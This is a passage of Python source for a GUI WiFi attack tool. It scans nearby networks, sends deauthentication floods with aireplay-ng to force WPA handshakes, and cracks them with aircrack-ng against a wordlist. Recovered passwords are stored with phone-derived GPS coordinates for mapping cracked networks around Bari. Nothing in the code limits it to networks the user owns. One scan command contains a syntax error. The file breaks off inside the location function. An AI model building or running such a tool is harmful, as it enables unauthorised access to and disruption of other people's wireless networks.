# -*- coding: utf-8 -*-
import os
import csv
import time
import subprocess
import pandas as pd
from datetime import datetime
import folium
import re
import glob
import signal
import shutil
from io import StringIO
import shlex
import threading
import queue
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import messagebox
from tkinter import filedialog
from PIL import Image, ImageTk
import webbrowser
import traceback
import sqlite3


WORDLIST = ""
WIFI_DB_FILE = "wifi_data.db"
TEMP_SCAN_PREFIX = "temp_scan_results"
TEMP_CLIENT_CHECK_PREFIX = "temp_client_check"
HANDSHAKE_DIR = "handshakes"
CRACKED_DIR = "cracked_passwords"
MAP_FILE_NAME = "cracked_wifi_map_bari.html"

BARI_COORDINATES = [41.1171, 16.8719]

WINDOW_ICON_PATH = "/home/pav/Scaricati/logonotext.png"
APP_LOGO_PATH = "/home/pav/Scaricati/Vista Logos (2)/logo-transparent-png.png"

monitor_interface_global = None
scan_process_obj = None
capture_process_obj = None
crack_processes = {}
main_queue = queue.Queue()

# --- GUI Functions ---
def log_to_gui(message):
    main_queue.put(("log", f"[{datetime.now().strftime('%H:%M:%S')}] {message}"))

def update_gui_status(message):
    main_queue.put(("status", message))

def check_command(command):
    if command == "folium":
        try:
            import folium
            import pandas
            return True
        except ImportError:
            log_to_gui("Error: Python libraries 'folium' and/or 'pandas' not found.")
            log_to_gui("Install them with: pip install folium pandas")
            return False
    elif shutil.which(command) is None:
        log_to_gui(f"Error: Command '{command}' not found.")
        if command in ["ip", "iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "adb"]:
             log_to_gui("Ensure standard Linux network tools (iproute2, iw),")
             log_to_gui("the aircrack-ng suite, and optionally adb are installed and in your PATH.")
        return False
    return True

def cleanup_temp_files(prefix):
    for f in glob.glob(f"{prefix}*"):
        try: os.remove(f)
        except OSError as e: log_to_gui(f"Warning: Error removing temp file {f}: {e}")

def terminate_process(process, name="Process"):
    if process and process.poll() is None:
        log_to_gui(f"Stopping {name} (PID: {process.pid})...")
        pgid = 0
        try:
             pgid = os.getpgid(process.pid)
             log_to_gui(f"Attempting to terminate process group {pgid} (SIGTERM).")
             os.killpg(pgid, signal.SIGTERM); process.wait(timeout=5)
             log_to_gui(f"{name} terminated successfully.")
        except ProcessLookupError: log_to_gui(f"{name} (PID: {process.pid}) already terminated."); return
        except subprocess.TimeoutExpired:
            log_to_gui(f"{name} did not terminate with SIGTERM, sending SIGKILL.")
            try:
                 if pgid != 0: os.killpg(pgid, signal.SIGKILL)
                 else: os.kill(process.pid, signal.SIGKILL)
                 process.wait(timeout=2); log_to_gui(f"{name} killed with SIGKILL.")
            except Exception as e_kill: log_to_gui(f"Error SIGKILL {name}: {e_kill}")
        except Exception as e_term: log_to_gui(f"Error SIGTERM {name}: {e_term}")

def create_dirs():
    try:
        os.makedirs(HANDSHAKE_DIR, exist_ok=True); os.makedirs(CRACKED_DIR, exist_ok=True)
        log_to_gui(f"Ensured directories '{HANDSHAKE_DIR}' and '{CRACKED_DIR}'.")
    except OSError as e:
        log_to_gui(f"Critical Error creating directories: {e}")
        messagebox.showerror("Directory Error", f"Could not create dirs: {e}. Check permissions.")

def table_exists(conn, table_name):
    """Helper function to check if a table exists in the SQLite database."""
    cursor = conn.cursor()
    # Usa i placeholder per evitare SQL injection se table_name potesse venire da input utente,
    # anche se qui è un nome fisso. Per coerenza:
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?;", (table_name,))
    return cursor.fetchone() is not None

def ensure_db_exists():
    """
    Ensures the WIFI_DB_FILE exists and contains the 'networks' table.
    Creates them if they don't exist. Returns True if successful, False otherwise.
    """
    db_existed_before = os.path.exists(WIFI_DB_FILE)
    conn = None
    table_created_now = False
    try:
        conn = sqlite3.connect(WIFI_DB_FILE)
        cursor = conn.cursor()

        if not table_exists(conn, "networks"):
            cursor.execute('''
                CREATE TABLE networks (
                    bssid TEXT PRIMARY KEY,
                    ssid TEXT,
                    power INTEGER,
                    channel TEXT,
                    encryption TEXT,
                    latitude REAL,
                    longitude REAL,
                    last_seen TEXT,
                    handshake_captured INTEGER DEFAULT 0,
                    password TEXT DEFAULT NULL,
                    handshake_filepath TEXT DEFAULT NULL
                )
            ''')
            conn.commit()
            table_created_now = True # Segna che la tabella è stata creata in questa chiamata

        if not db_existed_before:
            log_to_gui(f"Database file '{os.path.basename(WIFI_DB_FILE)}' did not exist and was created.")
        elif table_created_now: # Logga solo se la tabella è stata creata ORA (non se esisteva già)
             log_to_gui(f"Table 'networks' did not exist in '{os.path.basename(WIFI_DB_FILE)}' and was created.")
        return True
    except sqlite3.Error as e:
        log_to_gui(f"SQLite error during DB/table ensure/creation for '{os.path.basename(WIFI_DB_FILE)}': {e}")
        return False
    except Exception as e_gen:
        log_to_gui(f"General error during DB/table ensure/creation for '{os.path.basename(WIFI_DB_FILE)}': {e_gen}")
        return False
    finally:
        if conn:
            conn.close()

# --- Core Functions (assumed correct from previous state) ---
def get_interfaces():
    interfaces = []
    if not check_command("ip"): return []
    try:
        result_ip = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, check=True, timeout=5)
        potential_interfaces = re.findall(r'^\d+:\s+([a-zA-Z0-9._-]+)(?:@\w+)?:\s+<.*?>.*\s+(?:link/(?:ether|ieee802.11)|ether)\s', result_ip.stdout, re.MULTILINE)
        if not potential_interfaces: log_to_gui("No network interfaces found via 'ip link'."); return []

        if check_command("iw"):
            checked_interfaces = []
            for iface in potential_interfaces:
                if iface == 'lo' or iface.startswith(('docker', 'veth', 'vmnet', 'virbr', 'bond', 'br-', 'eth', 'enp', 'eno', 'ens')): continue
                try:
                    iw_check = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=3)
                    if iw_check.returncode == 0 and re.search(r'\s+type\s+(managed|monitor|ap|mesh)\b', iw_check.stdout):
                        checked_interfaces.append(iface)
                except (subprocess.TimeoutExpired, FileNotFoundError): log_to_gui(f"Warning: 'iw' check failed for {iface}.")
                except Exception as e_iw: log_to_gui(f"Warning: Error checking {iface} with iw: {e_iw}")
            interfaces = checked_interfaces
            log_to_gui(f"Wireless interfaces verified via 'iw': {', '.join(interfaces) if interfaces else 'None'}")
        else:
            interfaces = [iface for iface in potential_interfaces if not (iface == 'lo' or iface.startswith(('docker', 'veth', 'vmnet', 'virbr', 'bond', 'br-', 'eth', 'enp', 'eno', 'ens')))]
            log_to_gui("Warning: 'iw' not found. Using basic interface name filtering.")
            log_to_gui(f"Potential wireless interfaces (unverified): {', '.join(interfaces) if interfaces else 'None'}")
        return interfaces
    except Exception as e: log_to_gui(f"Error getting interfaces: {e}"); return []

def monitor_mode_task(interface):
    global monitor_interface_global
    log_to_gui(f"--- Activating Monitor Mode on {interface} ---")
    if not all(check_command(cmd) for cmd in ["sudo", "airmon-ng", "iw"]):
        main_queue.put(("monitor_result", None)); return

    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, timeout=15)
    log_to_gui("'airmon-ng check kill' executed.")
    time.sleep(2)

    monitor_cmd_list = ["sudo", "airmon-ng", "start", interface]
    monitor_interface = None
    try:
        result = subprocess.run(monitor_cmd_list, capture_output=True, text=True, check=True, timeout=20)
        log_to_gui(f"Airmon-ng output:\n{result.stdout}")
        match = re.search(r'(?:monitor mode vif enabled|enabled monitor mode|monitor mode enabled).*(?:for \[phy\d+\](\w+)|on\s+([^\s\(]+))', result.stdout, re.IGNORECASE | re.MULTILINE)
        mon_iface_cand = (match.group(1) or match.group(2)).strip() if match else None

        if mon_iface_cand:
            iw_info_res = subprocess.run(["iw", "dev", mon_iface_cand, "info"], capture_output=True, text=True, timeout=5, check=True)
            if "type monitor" in iw_info_res.stdout:
                monitor_interface = mon_iface_cand
                log_to_gui(f"Monitor mode confirmed on {monitor_interface} via 'iw'.")
            else: log_to_gui(f"Warning: 'iw' does not report 'type monitor' for {mon_iface_cand}.")
        else: # Fallback
            iw_dev_res = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5, check=True)
            monitor_match_iw = re.search(r'Interface\s+(\w+).*?\n\s+type\s+monitor', iw_dev_res.stdout, re.DOTALL)
            if monitor_match_iw:
                monitor_interface = monitor_match_iw.group(1)
                log_to_gui(f"Monitor interface detected via fallback 'iw dev': {monitor_interface}")
            else: log_to_gui("Fallback detection failed for monitor interface.")
    except subprocess.CalledProcessError as e:
        log_to_gui(f"Error with airmon-ng: {e.stderr.strip() if e.stderr else e.stdout.strip()}")
        try:
            iw_info_res = subprocess.run(["iw", "dev", interface, "info"], capture_output=True, text=True, timeout=5)
            if iw_info_res.returncode == 0 and "type monitor" in iw_info_res.stdout:
                monitor_interface = interface; log_to_gui(f"{interface} is already in monitor mode (fallback check).")
        except Exception: pass
    except Exception as e: log_to_gui(f"Unexpected error activating monitor mode: {e}")

    monitor_interface_global = monitor_interface
    main_queue.put(("monitor_result", monitor_interface))

def stop_monitor_mode_task(interface):
    global monitor_interface_global
    if not interface: main_queue.put(("monitor_stopped", (False, interface))); return
    log_to_gui(f"--- Stopping Monitor Mode on {interface} ---")
    success = False
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True, timeout=20, capture_output=True, text=True)
        monitor_interface_global = None; success = True
        log_to_gui(f"Monitor mode stopped on {interface}.")
        original_iface = interface.replace("mon", "")
        if original_iface != interface and check_command("ip"):
            subprocess.run(["sudo", "ip", "link", "set", original_iface, "up"], timeout=5, check=False, capture_output=True)
            log_to_gui(f"Attempted to bring {original_iface} UP.")
    except Exception as e: log_to_gui(f"Error stopping monitor mode on {interface}: {e}")
    main_queue.put(("monitor_stopped", (success, interface)))

def scan_wifi_networks_task(interface, duration=25):
    global scan_process_obj
    log_to_gui(f"\n--- Scanning WiFi on {interface} ({duration}s) ---")
    if not check_command("airodump-ng"): main_queue.put(("scan_result", [])); return
    cleanup_temp_files(TEMP_SCAN_PREFIX)
    scan_file_base = os.path.join(os.getcwd(), TEMP_SCAN_PREFIX)
    if not re.match(r'^[a-zA-Z0-9._-]+$', interface):
        log_to_gui(f"Invalid interface name: {interface}"); main_queue.put(("scan_result", [])); return

    scan_cmd = ["sudo", "airodump-ng", interface, ,"--band", "a", "--output-format", "csv", "-w", scan_file_base, "--write-interval", "1"]
    networks = []
    try:
        scan_process_obj = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        for i in range(duration):
            if scan_process_obj.poll() is not None:
                log_to_gui(f"Scan process ended prematurely. Stderr: {scan_process_obj.stderr.read()}"); break
            time.sleep(1)
            if i % 5 == 0 and i > 0: update_gui_status(f"Scanning... {duration-i}s left")
        else: log_to_gui("Scan duration finished.")
    except Exception as e: log_to_gui(f"Scan error: {e}")
    finally:
        if scan_process_obj and scan_process_obj.poll() is None: terminate_process(scan_process_obj, "Network Scan")
        scan_process_obj = None

    scan_files = glob.glob(f"{scan_file_base}-*.csv")
    if not scan_files: log_to_gui("No scan CSV files found."); main_queue.put(("scan_result", [])); return
    latest_scan_file = max(scan_files, key=os.path.getctime)
    try:
        with open(latest_scan_file, "r", encoding="utf-8", errors='ignore') as f: content = f.read()
        networks = parse_airodump_csv(content)
    except Exception as e: log_to_gui(f"Error parsing {latest_scan_file}: {e}")
    finally: cleanup_temp_files(TEMP_SCAN_PREFIX)
    networks.sort(key=lambda x: x.get("power", -100), reverse=True)
    main_queue.put(("scan_result", networks))

def parse_airodump_csv(csv_content):
    networks = []
    try:
        parts = re.split(r'\r?\n\s*Station MAC,', csv_content, maxsplit=1); ap_section = parts[0]
        ap_reader = csv.reader(StringIO(ap_section)); header = None; indices = {}
        target_keys = {"BSSID": ["BSSID"], "channel": ["channel", " CH"], "ESSID": ["ESSID"], "Power": ["Power"],
                       "Privacy": ["Privacy"], "Cipher": ["Cipher"], "Authentication": ["Authentication"], "Encryption": ["Encryption"]}
        for row in ap_reader:
            row = [f.strip() for f in row]
            if not row or len(row) < 3: continue
            if not header and any(h in row for k,v in target_keys.items() for h in v if k in ["BSSID","ESSID"]):
                header = row;
                for key, p_headers in target_keys.items():
                    idx = -1
                    for hdr_name in p_headers:
                        try: idx = header.index(next(h for h in header if hdr_name in h)); break
                        except: continue
                    indices[key] = idx
                if indices.get("BSSID",-1)==-1 or indices.get("channel",-1)==-1 or indices.get("ESSID",-1)==-1:
                    log_to_gui("Warning: Essential CSV columns missing."); return []
                continue
            if header:
                try:
                    bssid = row[indices["BSSID"]]
                    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid): continue
                    channel_str = row[indices["channel"]]
                    channel = int(channel_str) if channel_str.isdigit() else channel_str
                    essid_str = row[indices["ESSID"]]
                    essid = essid_str.replace('\x00','').strip() or "<Hidden>"
                    power_str = row[indices["Power"]] if indices.get("Power", -1) != -1 and len(row) > indices["Power"] else "-100"
                    power = int(power_str.strip()) if power_str.strip().lstrip('-').isdigit() else -100

                    sec_parts = []
                    for key_sec in ["Privacy", "Cipher", "Authentication", "Encryption"]:
                        idx_sec = indices.get(key_sec, -1)
                        if idx_sec != -1 and len(row) > idx_sec and row[idx_sec].strip():
                            sec_parts.append(row[idx_sec].strip())

                    seen_sec = set(); unique_sec_parts = [x for x in sec_parts if not (x in seen_sec or seen_sec.add(x))]

                    full_enc = " ".join(p for p in unique_sec_parts if p and p.upper() != "OPN").strip()
                    if not full_enc:
                        full_enc = "OPN" if any(p.upper() == "OPN" for p in unique_sec_parts) else "Unknown"

                    full_enc = full_enc.replace("WPA2 WPA","WPA/WPA2").replace("WPA WPA2","WPA/WPA2").replace("WPA2WPA","WPA/WPA2")
                    full_enc = re.sub(r'\s+',' ',full_enc).replace("PSK PSK","PSK")
                    if "WPA3" in full_enc and "WPA2" in full_enc:
                        if "SAE" in full_enc and "PSK" in full_enc: full_enc = "WPA3/WPA2 (SAE/PSK)"
                        elif "SAE" in full_enc: full_enc = "WPA3/WPA2 (SAE)"
                        elif "PSK" in full_enc: full_enc = "WPA3/WPA2 (PSK)"
                        else: full_enc = "WPA3/WPA2"
                    networks.append({"bssid":bssid, "ssid":essid, "power":power, "channel":channel, "encryption":full_enc})
                except (IndexError, ValueError) as e_row: log_to_gui(f"Row parse error: {row} -> {e_row}")
                except Exception as e_fatal_row: log_to_gui(f"Unexpected row parse error: {row} -> {e_fatal_row}"); traceback.print_exc()
    except Exception as e_parse: log_to_gui(f"CSV parse critical error: {e_parse}"); traceback.print_exc()
    return networks

def check_for_clients_task(interface, bssid, channel):
    log_to_gui(f"\nChecking clients on {bssid} (Ch: {channel})...")
    if not check_command("airodump-ng"): main_queue.put(("client_check_result",(bssid,False,"airodump-ng error"))); return
    cleanup_temp_files(TEMP_CLIENT_CHECK_PREFIX)
    safe_bssid = bssid.replace(':','-'); check_file_base = os.path.join(os.getcwd(), f"{TEMP_CLIENT_CHECK_PREFIX}_{safe_bssid}")
    if not (re.match(r'^[a-zA-Z0-9._-]+$',interface) and re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',bssid) and str(channel).isdigit()):
        main_queue.put(("client_check_result",(bssid,False,"invalid params"))); return

    check_cmd = ["sudo","airodump-ng","--bssid",bssid,"-c",str(channel),interface,"--output-format","csv","-w",check_file_base,"--write-interval","1"]
    check_proc = None; found = False; status = "No clients found"; duration = 15
    try:
        check_proc = subprocess.Popen(check_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        for _ in range(duration):
            if check_proc.poll() is not None: log_to_gui("Client check ended."); break
            time.sleep(1)
        else: log_to_gui("Client check duration finished.")
    except Exception as e: log_to_gui(f"Client check start error: {e}"); status="Start Error"
    finally:
        if check_proc and check_proc.poll() is None: terminate_process(check_proc, f"Client Check ({bssid})")

    if "Error" not in status:
        csv_files = glob.glob(f"{check_file_base}-*.csv")
        if csv_files:
            latest_csv = max(csv_files, key=os.path.getctime)
            try:
                with open(latest_csv,"r",encoding="utf-8",errors='ignore') as f: content=f.read()
                parts = re.split(r'\r?\n\s*Station MAC,', content, maxsplit=1)
                if len(parts)>1:
                    client_reader = csv.reader(StringIO(parts[1])); count = 0
                    for row in client_reader:
                        row = [f.strip() for f in row if f.strip()]
                        if row and len(row)>5 and re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',row[0]) and \
                           row[5].strip()==bssid and row[0].lower()!='ff:ff:ff:ff:ff:ff':
                             found=True; count+=1
                    if found: status = f"Yes ({count})"
                else: status = "No client section"
            except Exception as e: log_to_gui(f"Client check parse error: {e}"); status="Parse Error"
        else: status = "No CSV Output"
    cleanup_temp_files(check_file_base) # Use check_file_base here for cleanup
    main_queue.put(("client_check_result", (bssid, found, status)))

def capture_handshake_task(interface, bssid, channel, ssid):
    global capture_process_obj
    log_to_gui(f"\n--- Capturing Handshake: {ssid} ({bssid}) Ch:{channel} ---")
    if not all(check_command(c) for c in ["airodump-ng","aireplay-ng","aircrack-ng"]):
        main_queue.put(("capture_result",(bssid,False,"Cmd Error", None))); return
    if not (re.match(r'^[a-zA-Z0-9._-]+$',interface) and \
            re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',bssid) and \
            str(channel).isdigit()):
        main_queue.put(("capture_result",(bssid,False,"Invalid Params", None))); return

    safe_ssid = re.sub(r'[\\/*?:"<>| ]','_', ssid) if ssid and ssid!="<Hidden>" else "UnknownSSID"
    # IMPORTANT: Ensure cap_file_base does NOT end with wildcard or number pattern yet
    cap_file_base = os.path.join(HANDSHAKE_DIR, f"handshake_{safe_ssid}_{bssid.replace(':','-')}")

    final_cap_filepath = None # Store the path of the file confirmed to have the handshake
    cap_cmd = ["sudo","airodump-ng",interface,"--bssid",bssid,"-c",str(channel),"-w",cap_file_base,"--output-format","cap","--write-interval","5"]
    captured = False; status = "Failed"

    try:
        capture_process_obj = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        time.sleep(5) # Initial wait for file creation

        # Check for handshake without deauth first
        latest_cap_file = get_latest_cap_file(cap_file_base)
        if latest_cap_file and check_handshake_in_file(latest_cap_file):
            captured=True; status="Yes (Early)"; final_cap_filepath = latest_cap_file

        # If not captured yet, try deauth attempts
        if not captured:
            for attempt in range(3):
                if capture_process_obj.poll() is not None: status="Airodump Error"; break # Check if process died
                log_to_gui(f"Deauth attempt {attempt+1}/3 for {bssid}...")
                deauth_cmd = ["sudo","aireplay-ng","--deauth","10","-a",bssid,interface]
                # Run deauth silently or capture output if needed for debugging
                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                time.sleep(15) # Wait for potential handshake exchange after deauth

                latest_cap_file = get_latest_cap_file(cap_file_base)
                if latest_cap_file and check_handshake_in_file(latest_cap_file):
                    captured=True; status=f"Yes (Deauth {attempt+1})"; final_cap_filepath = latest_cap_file; break # Exit loop once captured

            # Final check after all deauth attempts (if still not captured and airodump didn't error)
            if not captured and status != "Airodump Error":
                log_to_gui(f"Deauth attempts finished for {bssid}, performing final check...")
                time.sleep(10) # One last wait
                latest_cap_file = get_latest_cap_file(cap_file_base)
                if latest_cap_file and check_handshake_in_file(latest_cap_file):
                    captured=True; status="Yes (Final Check)"; final_cap_filepath = latest_cap_file

    except Exception as e: log_to_gui(f"Handshake capture error: {e}"); status="Capture Error"
    finally:
        # Ensure airodump-ng is stopped regardless of outcome
        if capture_process_obj and capture_process_obj.poll() is None:
            terminate_process(capture_process_obj, f"Capture ({ssid})")
        capture_process_obj = None

        # --- *** NEW FILE CLEANUP LOGIC *** ---
        if not captured:
            log_to_gui(f"Handshake NOT detected for {bssid}. Cleaning up capture files...")
            # Use glob to find all files potentially created by this airodump-ng instance
            # (e.g., handshake_MySSID_AA-BB-CC-DD-EE-FF-01.cap, etc.)
            files_to_delete = glob.glob(f"{cap_file_base}*.cap")
            deleted_count = 0
            if not files_to_delete:
                 log_to_gui(f"No .cap files found matching pattern '{os.path.basename(cap_file_base)}*.cap' to delete.")
            else:
                log_to_gui(f"Found {len(files_to_delete)} file(s) to potentially delete for {bssid}.")
                for cap_file_to_del in files_to_delete:
                    try:
                        os.remove(cap_file_to_del)
                        log_to_gui(f"Deleted unsuccessful capture file: {os.path.basename(cap_file_to_del)}")
                        deleted_count += 1
                    except OSError as e_del:
                        log_to_gui(f"Warning: Could not delete capture file {os.path.basename(cap_file_to_del)}: {e_del}")
                if files_to_delete and deleted_count == 0:
                     log_to_gui(f"Warning: Found files to delete but failed to remove any for {bssid}.")
            # Ensure final_cap_filepath is None if we didn't capture
            final_cap_filepath = None
        # --- *** END OF NEW FILE CLEANUP LOGIC *** ---

        # Report result to GUI
        if captured and final_cap_filepath:
            log_to_gui(f"Handshake capture SUCCESS for {bssid}. File: {os.path.basename(final_cap_filepath)}")
        elif captured: # Should ideally not happen if logic is correct, but as a fallback
             log_to_gui(f"Handshake captured for {bssid}, but final filepath variable was not set correctly.")
        else: # Already logged cleanup message above if not captured
             log_to_gui(f"Could not capture handshake for {bssid}. Status: {status}")

        main_queue.put(("capture_result", (bssid, captured, status, final_cap_filepath))) # Pass the specific file path only if captured


def get_latest_cap_file(file_base_path):
    files = glob.glob(f"{file_base_path}*.cap")
    return max(files, key=os.path.getmtime) if files else None

def check_handshake_in_file(cap_filepath):
    if not cap_filepath or not os.path.exists(cap_filepath): return False
    try:
        res = subprocess.run(["aircrack-ng", cap_filepath], capture_output=True, text=True, timeout=10, check=False)
        return bool(re.search(r'\(\s*[1-9]\d*\s+handshake(?:s)?\s*\)', res.stdout, re.IGNORECASE))
    except subprocess.TimeoutExpired: log_to_gui(f"Warning: Handshake check timed out for {os.path.basename(cap_filepath)}.")
    except FileNotFoundError: log_to_gui("Error: aircrack-ng not found for handshake check."); return False
    except Exception as e: log_to_gui(f"Handshake check error on {os.path.basename(cap_filepath)}: {e}"); return False

def crack_handshake_task(bssid, ssid, cap_file, wordlist):
    global crack_processes
    log_to_gui(f"\n--- Cracking: {ssid} ({bssid}) ---"); status="Failed"; key=None
    # Access self.selected_wordlist.get() here if needed for detailed error later, but it's part of the app context
    # For a standalone task, wordlist path is passed as argument.
    # For GUI related detailed error messages, if this task was part of a class method, you could use self.selected_wordlist.get()

    if not all(check_command(c) for c in ["aircrack-ng"]) or \
       not os.path.exists(wordlist) or not os.path.exists(cap_file) or \
       not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',bssid):
        status_detail = "Pre-check Failed"
        if not check_command("aircrack-ng"): status_detail = "Aircrack-ng cmd missing"
        elif not os.path.exists(wordlist): status_detail = f"Wordlist not found: {os.path.basename(wordlist)}"
        elif not os.path.exists(cap_file): status_detail = f"Capture file not found: {os.path.basename(cap_file)}"
        elif not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',bssid): status_detail = "Invalid BSSID format"
        main_queue.put(("crack_result",(bssid,key,status_detail,cap_file))); return

    output_file = os.path.join(CRACKED_DIR, f"cracked_{bssid.replace(':','-')}.txt")
    crack_cmd = ["sudo","aircrack-ng","-a2","-b",bssid,"-w",wordlist,"-l",output_file,"-q",cap_file]
    crack_proc = None
    try:
        crack_proc = subprocess.Popen(crack_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        crack_processes[bssid] = crack_proc
        stdout, stderr = crack_proc.communicate(timeout=7200) # stdout e stderr sono catturati qui

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, 'r', encoding='utf-8') as f: key_from_file = f.read().strip()
            if key_from_file: key = key_from_file; log_to_gui(f"*** KEY FOUND (from file) for {bssid}: {key} ***")
            else: status = "Found (EmptyFile)" # Should not happen if key is written correctly
        elif not key and re.search(r'KEY FOUND!', stdout, re.IGNORECASE):
            match = re.search(r'KEY FOUND!\s*\[\s*(.*?)\s*\]', stdout, re.IGNORECASE)
            if match and match.group(1).strip():
                key = match.group(1).strip(); log_to_gui(f"*** KEY FOUND (from stdout) for {bssid}: {key} ***")
                try:
                    with open(output_file, 'w', encoding='utf-8') as f_out: f_out.write(key + "\n")
                except Exception as e_write: log_to_gui(f"Warning: Could not write key to file: {e_write}")
            else: log_to_gui(f"KEY FOUND! in stdout for {bssid}, but key parse failed.")

        if key: status = f"FOUND: {key}"
        elif "Passphrase not in dictionary" in stdout or "Failed" in stdout : status = "Not Found (No Match)"
        elif crack_proc.returncode != 0: # Errore durante l'esecuzione di aircrack-ng
            raw_stderr = stderr.strip() if stderr else "No stderr output from aircrack-ng."
            log_to_gui(f"Aircrack-ng failed for {bssid} (exit code {crack_proc.returncode}). Raw stderr: '{raw_stderr}'")

            # Tentativo di interpretare l'errore basato su stderr
            if re.search(r"No valid WPA/WPA2 handshake\(s\) for BSSID", raw_stderr, re.IGNORECASE) or \
               re.search(r"did not find the BSSID \S+ in the capture file", raw_stderr, re.IGNORECASE) or \
               re.search(r"No matching BSSID found", raw_stderr, re.IGNORECASE):
                status = "Aircrack: No specific HS for BSSID"
                log_to_gui(f"Detailed error for {bssid}: Aircrack-ng reported no valid WPA/WPA2 handshake for the specified BSSID ('{bssid}') in the capture file ('{os.path.basename(cap_file)}'). The capture might contain handshakes for other networks, or the handshake for this BSSID is incomplete/corrupt.")
            elif re.search(r"Please specify a dictionary", raw_stderr, re.IGNORECASE) or \
                 re.search(r"Can't open wordlist file", raw_stderr, re.IGNORECASE) or \
                 re.search(r"Error opening file", raw_stderr, re.IGNORECASE) and os.path.basename(wordlist) in raw_stderr:
                status = "Aircrack: Wordlist Problem"
                log_to_gui(f"Detailed error for {bssid}: Aircrack-ng reported an issue with the wordlist ('{os.path.basename(wordlist)}'). It might be missing, not readable, or in an incorrect format. Check path and permissions.")
            elif re.search(r"Read 0 packets", raw_stderr, re.IGNORECASE):
                status = "Aircrack: .cap File Issue"
                log_to_gui(f"Detailed error for {bssid}: Aircrack-ng reported reading zero packets from the capture file ('{os.path.basename(cap_file)}'). The file might be empty, corrupted, or not a valid pcap/cap format.")
            elif re.search(r"Unsupported KDF type", raw_stderr, re.IGNORECASE):
                status = "Aircrack: Unsupported KDF"
                log_to_gui(f"Detailed error for {bssid}: Aircrack-ng encountered an unsupported Key Derivation Function. This could indicate a newer WPA3 feature or an unusual WPA2 configuration not fully supported by your aircrack-ng version.")
            elif re.search(r"Invalid BSSID length", raw_stderr, re.IGNORECASE):
                 status = "Aircrack: Invalid BSSID"
                 log_to_gui(f"Detailed error for {bssid}: Aircrack-ng reported an invalid BSSID length. This should be caught by pre-checks, but verify BSSID format.")
            else:
                # Errore generico non specificamente interpretato, mostra parte di stderr
                short_err_msg = (raw_stderr[:70] + '...') if len(raw_stderr) > 70 else raw_stderr
                if not short_err_msg: short_err_msg = f"(Aircrack Exit Code: {crack_proc.returncode})" # Fallback if stderr is empty
                status = f"Aircrack Error: {short_err_msg}"
                log_to_gui(f"Detailed error for {bssid}: Aircrack-ng exited with an unclassified error (code {crack_proc.returncode}). Raw stderr: '{raw_stderr}'")
        else: status = "Not Found (No Match)" # Se returncode è 0 ma nessuna chiave trovata e non "Passphrase not in dictionary"

        # Rimuovi il file .txt se il cracking non ha avuto successo e il file è vuoto
        if status.startswith("Not Found") or "Error" in status or "Problem" in status or "Issue" in status:
            if os.path.exists(output_file) and os.path.getsize(output_file) == 0:
                try: os.remove(output_file); log_to_gui(f"Removed empty output file: {os.path.basename(output_file)}")
                except OSError as e_rm: log_to_gui(f"Warning: Could not remove empty output file {os.path.basename(output_file)}: {e_rm}")

    except subprocess.TimeoutExpired: status="Timeout (7200s)"; log_to_gui(f"Cracking timed out for {bssid} after 2 hours.")
    except Exception as e: status=f"Exec Error ({type(e).__name__})"; log_to_gui(f"Unexpected crack execution error for {bssid}: {e}")
    finally:
        if crack_proc and crack_proc.poll() is None : terminate_process(crack_proc, f"Cracking ({ssid})")
        if bssid in crack_processes: del crack_processes[bssid]
    main_queue.put(("crack_result",(bssid,key,status,cap_file)))
def get_location_task():
    log_to_gui("\n--- Attempting ADB Location ---"); lat, lon = None, None
    if not check_command("adb"): main_queue.put(("location_result",(None,None))); return
    try:
        dev_res=subprocess.run(["adb","devices"], capture_output=True, text=True, timeout=10, check=True)
        if not re.search(r'^\S+\s+device$', dev_res.stdout, re.MULTILINE):
            log_to_gui("No ADB device/emulator found or ready."); main_queue.put(("location_result",(None,None))); return

        proc_output = subprocess.run(["adb","shell","dumpsys","location"], capture_output=True, text=True, timeout=25, check=True)
        output = proc_output.stdout
        fused_matches = re.findall(r'Location\[fused\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+).*?time=(\d+)', output)
        if fused_matches:
            fused = max(fused_matches, key=lambda x: int(x[3]))
            lat, lon = fused[0], fused[1]
            log_to_gui(f"Found Fused Location: Lat={lat}, Lon={lon} (Accuracy={fused[2]}m)")
        else:
            gps_match = re.search(r'Location\[gps\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+)', output)
            net_match = re.search(r'Location\[network\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+)', output)
            if gps_match: lat,lon = gps_match.group(1), gps_match.group(2); log_to_gui(f"Found GPS Location: Lat={lat}, Lon={lon}")
            elif net_match: lat,lon = net_match.group(1), net_match.group(2); log_to_gui(f"Found Network Location: Lat={lat}, Lon={lon}")
            else: log_to_gui("Could not find detailed location data in dumpsys output.")
